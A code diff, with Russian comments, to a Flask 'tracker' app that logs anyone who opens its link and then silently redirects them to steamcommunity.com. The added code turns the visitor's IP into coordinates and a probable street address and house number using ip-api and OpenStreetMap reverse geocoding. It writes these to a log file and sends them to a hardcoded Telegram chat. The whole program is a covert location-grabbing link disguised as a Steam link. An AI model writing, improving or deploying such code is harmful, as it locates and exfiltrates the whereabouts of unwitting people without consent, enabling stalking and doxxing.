@@ -2,6 +2,7 @@ from flask import Flask, request, redirect
 import datetime
 import requests
 import os
+import json
 
 app = Flask(__name__)
 
@@ -10,15 +11,56 @@ CHAT_ID = "7352598189"
 LOG_FILE = "visits.txt"
 REDIRECT_URL = "https://steamcommunity.com/"
 
-def get_geo(ip):
+def get_full_geo(ip):
+    """Получает страну, город, координаты и примерный адрес"""
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
+        # 1. Получаем базовые данные + координаты
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,org,as,timezone")
         d = r.json()
-        if d['status'] == 'success':
-            return f"{d['country']}, {d['city']} ({d['isp']})"
-    except:
-        pass
-    return "Unknown"
+        if d['status'] != 'success':
+            return "Неизвестно", None, None
+        
+        country = d.get('country', 'Неизвестно')
+        city = d.get('city', 'Неизвестно')
+        lat = d.get('lat')
+        lon = d.get('lon')
+        isp = d.get('isp', 'Неизвестно')
+        
+        # 2. Пробуем получить точный адрес через Nominatim (OpenStreetMap)
+        address = f"{country}, {city}"
+        if lat and lon:
+            try:
+                geo_req = requests.get(
+                    f"https://nominatim.openstreetmap.org/reverse",
+                    params={
+                        "lat": lat,
+                        "lon": lon,
+                        "format": "json",
+                        "zoom": 18,
+                        "addressdetails": 1
+                    },
+                    headers={"User-Agent": "MyTracker/1.0"}
+                )
+                if geo_req.status_code == 200:
+                    geo_data = geo_req.json()
+                    if 'address' in geo_data:
+                        addr = geo_data['address']
+                        parts = []
+                        if 'road' in addr: parts.append(addr['road'])
+                        if 'house_number' in addr: parts.append(addr['house_number'])
+                        if 'suburb' in addr: parts.append(addr['suburb'])
+                        if parts:
+                            address = f"{country}, {city}, " + ", ".join(parts)
+            except:
+                pass
+        
+        # 3. Формируем результат
+        coords = f"{lat}, {lon}" if lat and lon else "Нет координат"
+        return address, coords, isp
+    
+    except Exception as e:
+        print(f"Geo error: {e}")
+        return "Ошибка геолокации", None, None
 
 def send_tg(msg):
     try:
@@ -35,11 +77,19 @@ def track():
     ua = request.headers.get('User-Agent', '')
     ref = request.headers.get('Referer', 'Direct')
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    geo = get_geo(ip)
-    log = f"[{now}] IP: {ip} | {geo} | UA: {ua[:60]} | Ref: {ref}\n"
+    
+    # Получаем расширенную геолокацию
+    address, coords, isp = get_full_geo(ip)
+    
+    # Лог в файл
+    log = f"[{now}] IP: {ip} | {address} | Координаты: {coords} | ISP: {isp} | UA: {ua[:60]} | Ref: {ref}\n"
     with open(LOG_FILE, 'a', encoding='utf-8') as f:
         f.write(log)
-    send_tg(f"Visit: {ip} | {geo}")
+    
+    # Отправка в Telegram с адресом и координатами
+    msg = f"📍 Новый визит!\nIP: {ip}\n📍 Адрес: {address}\n🗺️ Координаты: {coords}\n🖥️ Устройство: {ua[:60]}"
+    send_tg(msg)
+    
     return redirect(REDIRECT_URL, 302)
 
 @app.route('/logs')
